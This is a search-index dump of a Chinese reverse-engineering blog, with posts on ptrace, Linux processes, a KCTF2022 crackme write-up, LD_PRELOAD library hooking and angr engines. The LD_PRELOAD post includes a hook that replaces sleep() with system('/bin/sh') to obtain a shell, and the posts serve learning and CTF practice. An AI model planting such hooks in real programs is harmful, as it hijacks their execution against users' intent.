{"categories":[{"title":"Angr","uri":"https://blog.dx39061.top/categories/angr/"},{"title":"Binary","uri":"https://blog.dx39061.top/categories/binary/"},{"title":"Crypto","uri":"https://blog.dx39061.top/categories/crypto/"},{"title":"Dev","uri":"https://blog.dx39061.top/categories/dev/"},{"title":"Life","uri":"https://blog.dx39061.top/categories/life/"},{"title":"Linux","uri":"https://blog.dx39061.top/categories/linux/"},{"title":"WriteUps","uri":"https://blog.dx39061.top/categories/writeups/"}],"posts":[{"content":"众说纷纭 最近在学ptrace的各种用法，看到使用PTRRACE_PEEKDATA读取数据时产生了疑惑\nptrace函数签名：\nlong ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); 大量文章中写道:\nPTRRACE_PEEKDATA从内存地址中读取一个字节，内存地址由addr给出\n重点在于读取一个字节，但奇怪的是ptrace函数返回值却是long类型\n少部分文章中改成了读取四个字节，估计是注意到了long类型返回值\n又去查了查ptrace文档，上面这么描述：\nRead a word at the address addr in the tracee\u0026rsquo;s memory, returning the word as the result of the ptrace() call.\n怎么又变成了一个字（word），两个字节？\n柳暗花明 最终发现了stackoverflow的一篇文章，其中提到ptrace文档中的一个note（小小吐槽一下，这个note在整篇文章的末尾，前文也没什么标注，不专门去找很难看到\nThe size of a \u0026ldquo;word\u0026rdquo; is determined by the operating-system variant (e.g., for 32-bit Linux it is 32 bits).\n由此终于清楚，这里所说的word由操作系统位数决定，32位系统上是32位，64位系统上是64位\n“字”的歧义 作为天天跟汇编打交道的逆向壬，我先入为主的认为一个word就是2字节，却忘了word的定义：\nA word is the amount of data that a machine can process at one time.\n之所以在汇编以及许多场合中把字（word）规定为2字节（2 bytes），大概是为了更统一、更准确地描述数据大小，并且出现了双字、四字之类的东西\n但仍有很多情况下，仍使用“字”的原始定义，与系统一次能处理的最大数据量相对应，long这种C语言数据结构的大小即是一个“字”\n","id":0,"section":"posts","summary":"众说纷纭 最近在学ptrace的各种用法，看到使用PTRRACE_PEEKDATA读取数据时产生了疑惑 ptrace函数签名： long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void","tags":["misunderstanding"],"title":"“字”的歧义--深入ptrace返回值类型","uri":"https://blog.dx39061.top/2022/11/%E5%AD%97%E7%9A%84%E6%AD%A7%E4%B9%89--%E6%B7%B1%E5%85%A5ptrace%E8%BF%94%E5%9B%9E%E5%80%BC%E7%B1%BB%E5%9E%8B/","year":"2022"},{"content":"linux ptrace技术（一）基本概述与函数参数 ptrace概述 逆向壬应该都对ptrace并不陌生，常出现于ELF文件的反调试中。\nptrace其实是linux的一种系统调用，一般用于调试技术。使用ptrace可以实现父进程对子进程的监控和控制，由此开发了动态分析工具如strace和gdb。因为同一时间一个子进程只能被唯一的父进程追踪，所以代码内调用ptrace看能否成功附加到主进程，可以用来检验是否有调试器附加到主进程，起到反调试的作用。\nptrace函数原型及参数 #include \u0026lt;sys/ptrace.h\u0026gt; long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); request：要进行的ptrace操作 pid：要操作的进程号 addr：要监控/修改的内存地址 data：要读取/写入的数据变量 常见request类型：\nPTRACE_TRACE: 表示本进程希望被父进程跟踪, 主动与父进程建立追踪机制\nPTRACE_PEEKTEXT, PTRACE_PEEKDATA: 从addr指定的内存地址中取出数据\nPTRACE_POKETEXT, PTRACE_POKEDATA: 向addr指定的内存地址中写入数据\nPETRACE_PEEKUSER: 从USER结构体中，偏移量为addr处取出数据\nPETRACE_POKEUSER: 向USER结构体中，偏移量为addr处写入数据\nPTRACE_CONT: 使子进程继续运行\nPTRACE_KILL: 杀掉子进程\nPTRACE_SINGLESTEP: 子进程单步执行\nPTRACE_ATTACH: 父进程和子进程建立追踪关系，并发送SIGSTOP信号使其暂停\nPTRACE_DETACH: 父进程解除对子进程的追踪关系，让子进程继续运行\nPTRACE_SEIZE: 父进程对子进程建立追踪关系，但不会让子进程暂停，且要指定data参数ptrace(PTRACE_SEIZE, pid, 0, PTRACE_0_flags);\nPTRACE_SYSCALL: 使被停止的子进程继续运行，并在下次进入或退出系统调用时停止。\nReference https://stackoverflow.com/questions/9803908/difference-between-ptraceptrace-peekuser-and-ptraceptrace-peekdata\n","id":1,"section":"posts","summary":"linux ptrace技术（一）基本概述与函数参数 ptrace概述 逆向壬应该都对ptrace并不陌生，常出现于ELF文件的反调试中。 ptrace其实","tags":["linux","reverse"],"title":"linux ptrace相关技术（一）基本概述与ptrace函数","uri":"https://blog.dx39061.top/2022/11/%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0%E4%B8%8Eptrace%E5%87%BD%E6%95%B0/","year":"2022"},{"content":"62进制大数运算 如何面对一堆乱七八糟的函数保持冷静与耐心是这道题最大的难点（（\n搜一下IRtzloZ6iuB会发现有关62进制的内容，结合0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz这个表基本可以确定。代码使用结构体存储大数，前四字节为位数len，后32字节为具体数据data，在IDA中可以自行创建结构体使代码更好看\n然后就是漫长的复原函数的过程，最终IDA函数列表中_main函数上面从上到下依次是：\nbase62_decode base62_init base62_cpy base62_cmp base62_add base62_sub base62_and base62_or base62_xor base62_mul base62_div base62_mod base62_mod_ret // 不修改参数值，返回值是结果 base62_shl base62_shr 三个或四个参数的函数第一个参数储存结果，两个参数的函数使用返回值作结果（init和cpy两个函数除外）\n复原main函数\nint __cdecl main(int argc, const char **argv, const char **envp) { int split_index; // edi int len; // eax int v6; // esi int v7; // eax char input; // [esp+8h] [ebp-40h] BYREF char v10[60]; // [esp+9h] [ebp-3Fh] BYREF __int16 v11; // [esp+45h] [ebp-3h] char v12; // [esp+47h] [ebp-1h] input = 0; memset(v10, 0, sizeof(v10)); v11 = 0; v12 = 0; printf((int)\u0026quot;Input:\u0026quot;); gets(\u0026amp;input); split_index = -1; len = 0; if ( !input ) goto LABEL_20; do { if ( len \u0026gt;= 64 ) break; if ( v10[len - 1] == '-' ) split_index = len; } while ( v10[len++] ); if ( split_index \u0026gt; 0 \u0026amp;\u0026amp; (v6 = len - split_index, len - split_index \u0026gt; 0) \u0026amp;\u0026amp; base62_decode(\u0026amp;left, \u0026amp;input, split_index, a0123456789abcd) \u0026gt; 0 \u0026amp;\u0026amp; base62_decode(\u0026amp;right, \u0026amp;v10[split_index], v6 - 1, a0123456789abcd) \u0026gt; 0 \u0026amp;\u0026amp; (base62_decode(\u0026amp;mod_const, aIrtzloz6iub, strlen(aIrtzloz6iub), a0123456789abcd), base62_init(\u0026amp;tmp1, 0), base62_init(\u0026amp;tmp2, 0), base62_cmp(\u0026amp;left, \u0026amp;right) \u0026lt; 0) // left \u0026lt; right \u0026amp;\u0026amp; base62_cmp(\u0026amp;left, \u0026amp;mod_const) \u0026lt; 0 // left \u0026lt; mod_const \u0026amp;\u0026amp; base62_cmp(\u0026amp;right, \u0026amp;mod_const) \u0026lt; 0 ) // right \u0026lt; mod_const { v7 = 0; while ( 1 ) { j = v7 + 1; base62_add(\u0026amp;tmp1, \u0026amp;tmp1, \u0026amp;left); base62_add(\u0026amp;tmp2, \u0026amp;tmp2, \u0026amp;right); base62_mod(\u0026amp;tmp1, \u0026amp;tmp1, \u0026amp;mod_const); base62_mod(\u0026amp;tmp2, \u0026amp;tmp2, \u0026amp;mod_const); base62_init(\u0026amp;var1, 1); base62_sub(\u0026amp;var1, \u0026amp;tmp1, \u0026amp;var1); if ( !base62_cmp(\u0026amp;var1, \u0026amp;left) ) { ++cnt; base62_mul(\u0026amp;var1, \u0026amp;var1, \u0026amp;left); } base62_init(\u0026amp;var2, 1); base62_add(\u0026amp;var2, \u0026amp;tmp2, \u0026amp;var2); if ( !base62_cmp(\u0026amp;var2, \u0026amp;right) ) { ++cnt; base62_div(\u0026amp;var2, \u0026amp;mod_const, \u0026amp;right); } if ( cnt == 10 ) break; v7 = j; if ( j \u0026gt;= 0x200000 ) goto LABEL_20; } printf((int)\u0026quot;Success!\\n\u0026quot;); return 0; } else { LABEL_20: printf((int)\u0026quot;Error.\\n\u0026quot;); return 0; } } 可以发现，input是被-分开的左右两部分字符串，然后把这两部分字符串当作62进制数使用base62_decode函数转成10进制（16进制）存入left和right，mod_const是由62进制数Bui6ZolztRI解码得到的，计算得到是10的19次方。下面还有对left和right的限制，即left \u0026lt; right \u0026lt; mod_const\n下面的while(1)循环中，只有cnt==0才能正常break输出Success，且通过交叉引用可以发现整个程序只有两个if中++cnt对cnt的值进行w引用，容易想到的check逻辑是：\n$( left * j_1 - 1) mod 10^{19} = left$\n$(right * j_2 + 1) mod 10^{19} = right$\n且在$1 \u0026lt;= j \u0026lt; 0x200000$中，随着j增大，j1、j2总共满足10次。这对一个逆向壬实属超纲了，于是做的时候这道题到这就陷入了死局。\n不起眼函数中暗藏关键逻辑 在复原各种函数时，我是一边动调，一边连蒙带猜，看出大概用途就直接把整个函数当作黑盒处理了。结束后看了看别队的wp，才发现在base62_mul和base62_div中末尾藏着两段关键的逻辑\nbase62_init(\u0026amp;var1, 4); // var1.data = 4 base62_shl(\u0026amp;var2.len, \u0026amp;var1.len, 3); // val2.data = 4 \u0026lt;\u0026lt; 3 = 32 if ( cnt \u0026gt; 0 \u0026amp;\u0026amp; *(_DWORD *)\u0026amp;mod_const.data[var2.data[0]] == var2.data[0] ) { base62_add(\u0026amp;var1, \u0026amp;var1, \u0026amp;var2); // var1.data = var1.data + var2.data = 4 + 32 = 36 v12 = base62_mod_ret(\u0026amp;var1, j); // v12 = var1.data % j = 36 % 32 = 4 mod_const.data[var1.data[0]] += 4; base62_shl(\u0026amp;var1.len, \u0026amp;var1.len, v12); base62_sub(\u0026amp;var2, \u0026amp;var1, \u0026amp;var2); } base62_init(\u0026amp;var1, 4); base62_shl(\u0026amp;var2.len, \u0026amp;var1.len, 3); if ( cnt \u0026gt; 0 \u0026amp;\u0026amp; *(_DWORD *)\u0026amp;mod_const.data[var2.data[0]] == var2.data[0] ) { base62_add(\u0026amp;var1, \u0026amp;var1, \u0026amp;var2); v11 = base62_mod_ret(\u0026amp;var1, ::j); mod_const.data[var1.data[0]] += 4; base62_shl(\u0026amp;var1.len, \u0026amp;var1.len, v11); base62_sub(\u0026amp;var2, \u0026amp;var1, \u0026amp;var2); } 数组越界取值是新颖还是刁难 在上述两段隐藏的逻辑中,开头两句先把var1初始化为4，再把var1左移3等于32赋给var2，下面的判断*(_DWORD *)\u0026amp;mod_const.data[var2.data[0]] == var2.data[0，var2.data[0] == 32，而mod_const.data只有32位，故访问下标32处会发生数组越界，可以发现下一个四字节存的是main函数中的j，所以判断条件实际是cnt \u0026gt; 0 \u0026amp;\u0026amp; j == 32\nif块中代码首先把var1.data改成了36，此时访问mod_const.data[var1.data[0]]同样会出现越界，实际访问的其实是main函数中的cnt，使cnt += 4，两个if块共加8，加上外层两个加1刚好为10,符合题目条件。\n此时再回到上面列出的等式，所求其实是j1 == j2 == 32时的特殊解\n即\n$$ \\left{ \\begin{matrix} ( left * 32 - 1) mod 10^{19} = left \\ ( right * 32 + 1) mod 10^{19} = right \\end{matrix} \\right. $$\n变形一下\n$$ \\left{ \\begin{matrix} left * 31 = k_1 * 10^{19} + 1 \\ right * 31 = k_2 * 10^{19} - 1 \\ left, right, k_1, k_2 \\in N^* \\ left \u0026lt; right \u0026lt; mod_const \\end{matrix} \\right. $$\n解得\nk1 = 12 k2 = 19 left = 0x35b870a6eb0f7bdf right = 0x550eb25d9ed88421 把left和right转换成62进制数即可得最终序列号ZSxZerX4xb4-jyvP7x12lI7\n","id":2,"section":"posts","summary":"62进制大数运算 如何面对一堆乱七八糟的函数保持冷静与耐心是这道题最大的难点（（ 搜一下IRtzloZ6iuB会发现有关62进制的内容，结合01","tags":["CTF","reverse"],"title":"KCTF2022秋季赛第二题WriteUp","uri":"https://blog.dx39061.top/2022/11/kctf2022%E7%A7%8B%E5%AD%A3%E8%B5%9B%E7%AC%AC%E4%BA%8C%E9%A2%98writeup/","year":"2022"},{"content":"进程状态 一台linux机器上运行着多个进程，每个进程在同一时间都处在一种特定的状态，称为进程状态，常见的进程状态如下：\nR(TASK_RUNNING)，可执行状态 由于一个单核CPU在同一时间只能执行一个进程，所以并不是所有处于可执行状态的进程都正在被CPU执行，处于可执行状态的进程会被添加到CPU的执行队列中，由进程调度器决定每一刻真正执行的是哪一个进程。\nS(TASK_INTERRUPTIBLE)，可中断的睡眠状态 处于这个状态的进程在等待着某些事件的发生（如等待socket连接、等待信号量等），属于挂起（睡眠）状态。使用top命令可以发现绝大多数进程都处于这个状态\nD(TASK_UNINTERRUPTIBLE)，不可中断的睡眠状态 与S状态类似，进程处于挂起（睡眠）状态，但此时进程无法被中断/杀死，不会响应进程信号（如SIGKILL），常用于系统底层某些不能被打断的进程\nT(TASK_STOPPED)，暂停状态 向处于TASK_RUNNING状态的进程发送一个SIGSTOP信号可以强制使进程停止，来到TASK_STOPPED状态，当接收到SIGCONT信号时，进程将重新回到TASK_RUNNING状态\nt(TASK_TRACED)，正在被跟踪状态 此状态下的进程也会暂停下来，等待跟踪它的调试进程对它进行操作。与TASK_STOPPED状态不同，此状态不会相应SIGCONT信号，只有调试进程调用PTRACE_CONT、PTRACE_DETACH或进程退出时被调试的进程才能恢复TASK_RUNNING状态\nZ(TASK_DEAD-EXIT_ZOMBIE)退出状态，成为僵尸进程 大致可分为两种情况：\n子进程退出但父进程并未及时释放子进程，称为僵尸状态\n父进程退出，但子进程仍然存在，称为孤儿状态\nX(TASK_DEAD-EXIT_DEAD)退出状态，进程即将被销毁 进程被置于此状态时，接下来立即会被完全释放，此状态持续时间十分短暂\n进程信号 控制进程状态的更新、变换需要系统发出信号，即进程信号，进程信号列表可以使用kill -l查看，\n进程信号调控进程状态，大致如下图：\n注：图中Running和Ready同属TASK_RUNNING状态\n进程创建 linux用户态创建进程常用fork、vfork、clone三个函数\n原理 三者都是依托父进程创建新的子进程，函数返回值在不同进程中值不同，在子进程中返回0，在父进程中返回子进程pid，返回值为负数则创建子进程失败。\n三者区别在于对进程空间的使用。fork函数创建的子进程会复制一份父进程的进程空间，vfork函数创建的子进程与父进程使用同一份进程空间，而clone函数可选是否共用各种资源。\nfork和vfork函数还有另外一个区别：fork函数创建的子进程与父进程同时运行，先后顺序随即。而vfork函数保证子进程先运行，只有当子进程退出时才会运行父进程，确保不会发生同时读写内存等竞争问题。\n下面针对fork和vfork函数进行尝试：\n使用fork函数 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; int main() { int num = 1; pid_t pid = fork(); // 创建子进程 if (pid == -1) { puts(\u0026quot;failed to create child process\u0026quot;); return -1; } else if (pid == 0) { puts(\u0026quot;in child process\u0026quot;); printf(\u0026quot;pid = %d\\n\u0026quot;, getpid()); printf(\u0026quot;num = %d\\n\u0026quot;, num); num = 10; printf(\u0026quot;num is modified by child process\\nnow num = %d\\n\\n\u0026quot;, num); } else { sleep(1); // 确保父进程运行到这时子进程已完成了对num的修改 puts(\u0026quot;in parent process\u0026quot;); printf(\u0026quot;pid = %d\\n\u0026quot;, getpid()); printf(\u0026quot;child process pid is %d\\n\u0026quot;, pid); // 父进程中fork函数返回值为子进程pid printf(\u0026quot;num = %d\\n\\n\u0026quot;, num); } } 程序输出：s\nin child process pid = 61209 num = 1 test is modified by child process now num = 10 in parent process pid = 61208 child process pid is 61209 num = 1 可以看到在子进程中修改了num的值，对父进程的num没有影响，正是因为父、子进程进程空间相互独立\nvfork函数 使用exit函数正常退出子进程 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; int main() { int num = 1; pid_t pid = vfork(); if (pid == -1) { puts(\u0026quot;failed to create child process\u0026quot;); return -1; } else if (pid == 0) { puts(\u0026quot;in child process\u0026quot;); printf(\u0026quot;pid = %d\\n\u0026quot;, getpid()); printf(\u0026quot;num = %d\\n\u0026quot;, num); num = 10; printf(\u0026quot;test is modified by child process\\nnow num = %d\\n\\n\u0026quot;, num); exit(0); // 退出子进程 } else { puts(\u0026quot;in parent process\u0026quot;); printf(\u0026quot;pid = %d\\n\u0026quot;, getpid()); printf(\u0026quot;child process pid is %d\\n\u0026quot;, pid); // 父进程中vfork函数返回值为子进程pid printf(\u0026quot;num = %d\\n\\n\u0026quot;, num); } } 程序输出：\nin child process pid = 62770 num = 1 test is modified by child process now num = 10 in parent process pid = 62769 child process pid is 62770 num = 10 可以看到在子进程中修改num的值，在父进程中输出num的值也改变了，正是因为两进程共用一块进程空间\n不能使用return退出子进程 将上个例子中使用exit(0)退出子进程改为使用return 0试试效果：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; int main() { int num = 1; pid_t pid = vfork(); if (pid == -1) { puts(\u0026quot;failed to create child process\u0026quot;); return -1; } else if (pid == 0) { puts(\u0026quot;in child process\u0026quot;); printf(\u0026quot;pid = %d\\n\u0026quot;, getpid()); printf(\u0026quot;num = %d\\n\u0026quot;, num); num = 10; printf(\u0026quot;test is modified by child process\\nnow num = %d\\n\\n\u0026quot;, num); return 0; } else { puts(\u0026quot;in parent process\u0026quot;); printf(\u0026quot;pid = %d\\n\u0026quot;, getpid()); printf(\u0026quot;child process pid is %d\\n\u0026quot;, pid); // 父进程中vfork函数返回值为子进程pid printf(\u0026quot;num = %d\\n\\n\u0026quot;, num); } } 程序输出：\nin child process pid = 65039 num = 1 test is modified by child process now num = 10 in parent process pid = 65038 child process pid is 65039 num = -1431084768 可以发现父进程输出的num出现了错误。\n这是因为子进程使用return返回意味着子进程中的main函数结束了，main函数的栈会被回收，然后子进程结束。因为父进程与子进程共享这个栈，而栈中存放的num值已不存在，故会打印出错。\n更进一步，如果把return也去掉，会发现效果是一样的，因为函数正常结束，一样会进行栈回收。\n总结来说，子进程退出一般都要使用exit函数\n使用exec函数族调起新的进程 exec函数族分别包括以下函数：\nint execl(const char *path, const char *arg, ...); int execlp(const char *file, const char *arg, ...); int execle(const char *path, const char *arg, ..., char * const envp[]); int execv(const char *path, char *const argv[]); int execvp(const char *file, char *const argv[]); int execve(const char *path, char *const argv[], char *const envp[]); 其中execve是linux的一个系统调用，其他函数都是对它的封装。功能是根据指定的路径或文件名找到相应的可执行文件，使用该可执行文件的代码段、数据段、堆栈数据替换当前进程中的数据，进行执行。\n要注意的是，使用exec函数族不会创建新的进程，不会改变pid，只是替换了当前进程空间的数据。\n回归正题，最开始只有一个fork函数可以用来创建新进程，但很多程序中仅仅是在新进程中使用了exec函数族调起了新的进程，这时fork函数复制整个父进程的进程空间就成了浪费。于是后来才产生了vfork函数。\n实践一下：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; int main() { int num = 1; pid_t pid = vfork(); if (pid == -1) { puts(\u0026quot;failed to create child process\u0026quot;); return -1; } else if (pid == 0) { puts(\u0026quot;in child process\u0026quot;); printf(\u0026quot;pid = %d\\n\u0026quot;, getpid()); printf(\u0026quot;num = %d\\n\u0026quot;, num); num = 10; printf(\u0026quot;test is modified by child process\\nnow num = %d\\n\\n\u0026quot;, num); char *argv[] = {\u0026quot;ls\u0026quot;, \u0026quot;-l\u0026quot;, \u0026quot;/\u0026quot;, NULL}; execve(\u0026quot;/bin/ls\u0026quot;, argv, NULL); // 调起ls进程 perror(\u0026quot;error exec\u0026quot;); // 打印错误 } else { sleep(1); puts(\u0026quot;in parent process\u0026quot;); printf(\u0026quot;pid = %d\\n\u0026quot;, getpid()); printf(\u0026quot;child process pid is %d\\n\u0026quot;, pid); // 父进程中vfork函数返回值为子进程pid printf(\u0026quot;num = %d\\n\\n\u0026quot;, num); } return 0; } 程序输出：\nin child process pid = 70303 num = 1 test is modified by child process now num = 10 total 33570236 lrwxrwxrwx 1 root root 7 Oct 19 05:01 bin -\u0026gt; usr/bin drwxr-xr-x 4 root root 4096 Nov 12 10:30 boot drwxr-xr-x 23 root root 4360 Nov 17 10:09 dev drwxr-xr-x 133 root root 12288 Nov 17 14:21 etc drwxr-xr-x 3 root root 4096 Jan 23 2022 home lrwxrwxrwx 1 root root 7 Oct 19 05:01 lib -\u0026gt; usr/lib lrwxrwxrwx 1 root root 7 Oct 19 05:01 lib64 -\u0026gt; usr/lib drwx------ 2 root root 16384 Jan 23 2022 lost+found drwxr-xr-x 3 root root 4096 Oct 19 00:40 mnt drwxr-xr-x 28 root root 4096 Nov 11 01:15 opt dr-xr-xr-x 429 root root 0 Nov 17 10:09 proc drwxr-x--- 26 root root 4096 Nov 10 18:35 root drwxr-xr-x 34 root root 940 Nov 17 14:19 run lrwxrwxrwx 1 root root 7 Oct 19 05:01 sbin -\u0026gt; usr/bin drwxr-xr-x 4 root root 4096 Jan 23 2022 srv -rw------- 1 root root 34359738368 Nov 2 23:05 swapfile dr-xr-xr-x 13 root root 0 Nov 17 10:09 sys drwxrwxrwt 19 root root 580 Nov 17 17:22 tmp drwxr-xr-x 11 root root 4096 Nov 17 01:09 usr drwxr-xr-x 15 root root 4096 Nov 17 10:09 var in parent process pid = 70302 child process pid is 70303 num = 10 可以看到ls进程被正常调起并正常输出\n但这里还有一个问题，按理说execve之后进程空间被完全被替换，回到父进程后应该无法正常运行，这里牵扯到一些内核机制问题，参考 https://www.zhihu.com/question/515280466\nReference Linux系统之进程状态 - 腾讯云开发者社区-腾讯云\n进程线程常见基础问题 | Whatbeg's blog\nhttps://book.itheima.net/course/223/1277519158031949826/1277528003525484545\nhttps://www.zhihu.com/question/515280466\n","id":3,"section":"posts","summary":"进程状态 一台linux机器上运行着多个进程，每个进程在同一时间都处在一种特定的状态，称为进程状态，常见的进程状态如下： R(TASK_RUNN","tags":["linux","reverse"],"title":"linux进程基础","uri":"https://blog.dx39061.top/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/","year":"2022"},{"content":"动态链接概述 程序员在编写代码时，常常需要使用外部库。外部库有静态库和动态库之分，二者都是经过编译、汇编但未进行链接的二进制文件（ELF文件）。\n二者区别在于下一步参与链接的方式：静态库用于静态链接，直接将静态库中的指令写入最终生成的可执行文件中。动态库用于动态链接，只将一些重定位和符号表信息“拷贝”到最终的可执行文件中。\n动态链接相比于静态链接，优势在于得到的可执行文件小很多，可扩展性更好、更新迭代更容易（只需更改动态链接库而不用整个重新编译）。劣势也很明显：需要运行时动态加载库函数，消耗更多时间和资源（但在很多场合中这种消耗是值得的），再有就是兼容性降低：不同的机器上的同名动态库可能有所不同，产生兼容性问题。\n代码中使用动态链接库的两种方式 加载时链接 需要包含头文件，但代码中无需多余的语句，示例如下：\nmain.c\n#include \u0026quot;lib.h\u0026quot; int main() { func(); return 0; } lib.h\n#include \u0026lt;stdio.h\u0026gt; void func(); lib.c\n#include \u0026quot;lib.h\u0026quot; void func() { puts(\u0026quot;func is called\u0026quot;); } 生成动态链接库\ngcc -fPIC --shared lib.c -o lib.so 使用动态链接库构建可执行文件\ngcc -o main main.c lib.so 此时直接运行main会报错无法找到动态链接库，这里需要指定环境变量LD_LIBRARY_PATH\nexport LD_LIBRARY_PATH=$LD_LIBRARY_PATH:./ 然后运行./main就可以看见正常程序输出\n运行时链接 使用dlfcn.h中封装的函数，在代码中需要的地方手动链接所需的动态库\n此时不需要lib.h文件，可以直接在lib.c中编写函数逻辑：\n#include \u0026lt;stdio.h\u0026gt; void func() { puts(\u0026quot;func is called\u0026quot;); } 生成动态库lib.so\ngcc -fPIC --shared lib.c -o lib.so main.c\n#include \u0026lt;dlfcn.h\u0026gt; int main() { // 打开动态链接库，获得动态链接库的handle void *handle = dlopen(\u0026quot;./lib.so\u0026quot;, RTLD_LAZY); // 定义func变量形式，准备接收func函数 void (*func)(); // 传入动态链接库的handle和寻找的符号 func = dlsym(handle, \u0026quot;func\u0026quot;); // 正常调用func函数 func(); return 0; } 编译链接生成可执行文件\ngcc -o main main.c 直接运行./main可正确执行函数\n使用LD_PRELOAD进行hook hook的基本原理 编译器在进行链接时，会首先加载环境变量LD_PRELOAD所指向的动态链接库。由于链接的具体步骤（此处不赘述，详情可查阅csapp或其他资料），同名的符号不会被重复加载，所以我们可以使用自己的动态库“覆盖”原来程序使用动态库的一些符号，达到hook的目的\n针对上述加载时链接的hook 编写hook.c，包含同名函数func：\n#include \u0026lt;stdio.h\u0026gt; void func() { puts(\u0026quot;func is hooked\u0026quot;); } 生成动态链接库hook.so\ngcc -fPIC --shared hook.c -o hook.so 原来生成的main可执行文件不变（环境变量也不变），执行：\nLD_PRELOAD=./hook.so ./main 可以发现func函数执行的是lib.c中的代码，hook成功\n无法针对运行时链接进行hook 显而易见的，运行时链接是指定了文件路径、获取制定文件中的符号，故无法通过LD_PRELOAD进行hook\n针对libc库中默认符号的hook 明白了hook的原理很容易发现，我们自己写的func函数与libc库中默认符号没有什么本质的区别，故只要定义同名的符号，就可以实现同样的hook\n此处以sleep函数为例，具体过程与上面无异，仅展示代码\nmain.c\n#include \u0026lt;stdio.h\u0026gt; int main() { puts(\u0026quot;hello, my friend\u0026quot;); sleep(3); puts(\u0026quot;bye\u0026quot;); return 0; } hook.c\n#include \u0026lt;stdio.h\u0026gt; void sleep() { puts(\u0026quot;hacked by dx3906\u0026quot;); } 直接运行./main和使用环境变量LD_PRELOAD=./hook.so ./main会有截然不同的效果\n通过hook到system函数get shell 这里仅仅是对此hook手段用途的一些畅想，实际上所用方法完全一致，这也是LD_PRELOAD进行hook极大的局限性。\n在能够hook的情况下，只需把hook函数的内容变成system调用即可get shell\n如把上个例子的hook.c改为如下：\n#include \u0026lt;stdlib.h\u0026gt; void sleep() { system(\u0026quot;/bin/sh\u0026quot;); } 原理已明，更多的用途读者可以尽情发挥想象力与创造力\n以上，如有疏漏请师傅们指出。\n","id":4,"section":"posts","summary":"动态链接概述 程序员在编写代码时，常常需要使用外部库。外部库有静态库和动态库之分，二者都是经过编译、汇编但未进行链接的二进制文件（ELF文件）","tags":["linux","reverse","binary"],"title":"linux下通过设置LD_PRELOAD环境变量hook动态链接库","uri":"https://blog.dx39061.top/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/","year":"2022"},{"content":"新域名：blog.dx39061.top 原来域名快到期了，续费又太贵，所以换了个，只是后缀从xyz换成了top 原域名解析还在不在了，但使用原域名打开会遇到证书错误问题. ","id":5,"section":"posts","summary":"新域名：blog.dx39061.top 原来域名快到期了，续费又太贵，所以换了个，只是后缀从xyz换成了top 原域名解析还在不在了，但使用原","tags":["life"],"title":"博客域名更换","uri":"https://blog.dx39061.top/2022/10/%E5%8D%9A%E5%AE%A2%E5%9F%9F%E5%90%8D%E6%9B%B4%E6%8D%A2/","year":"2022"},{"content":"Execution Engines 当你使用angr进行单步执行时，某些东西实际地进行了执行，即angr的一系列引擎（SimEngine的子类），它们会模拟给定代码段对输入状态的影响。angr的执行内核只是依次尝试所有可用的引擎，使用第一个可以处理该步骤的引擎。默认的引擎列表，按顺序排列如下：\n故障引擎（failuer engine）：当某一步导致一个无法继续的状态时，故障引擎启动。\n系统调用引擎（syscall engine）：当某一部产生系统调用时，系统调用引擎启动。\nhook引擎（hook engine）：当当前地址被hook时启动\nunicorn引擎（unicorn engine）：当UNICORN状态选项开启并且状态中无符号数据时unicorn引擎启动\nVEX引擎（VEX engine）：VEX引擎是最终后备引擎\n模拟后继（SimSuccessors） 实际上依次尝试所有可用引擎的函数是project.factory.successprs(state, **kwargs)，它将参数传递给每个引擎。这个函数是state.step()和simulation_manager.step()的核心，它返回一个SimSuccessors对象。设计SimSuccessors的目的是对存储在各种列表属性中的后继状态进行简单分类，如下：\n类别（Attribute） 警戒条件（Guard Condition） 命令指针（Instruction Pointer） 描述（Description） successors True（可以被符号化，但被限制为True） 可以被符号化（但最多有256个solution）参阅unconstrained_successors 引擎处理正常可满足的状态，该状态的指令指针可能是符号化的（根据用户输入进行跳转），所以这个状态可能代表了几个潜在的后继状态 unsat_successors False（可以被符号化，但被限制为False） 可以被符号化 不可满足的后继状态，它的Guard Condition只能为Flase（即不能进行跳转或必须进行默认分支跳转） flat_successors True（可以被符号化，但被限制为True） 具体的值 如上所述，后继列表中的状态可以具有符号指令指针。这个理解起来十分复杂，和在其他地方的代码（例如SimEngineVEX.process当其中状态向前执行时），我们假设单个状态仅代表代码中单个点的执行。为了便于理解，当我们遇到带有符号指令指针的后继状态时我们为它们计算所有可能的solution，并为每一个这样的solution制作一份状态拷贝，我们称这个过程为扁平化。这些flat_successors是一些状态，它们每个状态都带有一个不同的具体值的指令指针。举个例子，如果后继状态的指令指针是X+5，而X有X\u0026gt;0x800000和X\u0026lt;=0x800010的约束。我们会将其展平为16个不同的flat_successors状态，指令指针从0x800006一直到0x80015 unconstrained_successors True（可以被符号化，但被限制为True） 符号化（超过256个solution） 在上述的扁平化过程中，如果指令指针有超过256种可能的solution，我们就假设该指令地址已被无约束数据覆盖（例如用户数据的栈溢出），这个情况一般是不合理的，这些状态被放在unconstrained_successors中，而不是后继状态中 all_successors anything 可以被符号化 上述三个successors的集合 断点（Breakpoints） TODO: rewrite this to fix the narrative\n和任何一个不错的执行引擎一样，angr支持设置断点。这很酷！你可以像下面这样设置断点：\n\u0026gt;\u0026gt;\u0026gt; import angr \u0026gt;\u0026gt;\u0026gt; b = angr.Project('examples/fauxware/fauxware') \u0026gt;\u0026gt;\u0026gt; s = b.factory.entry_state() # 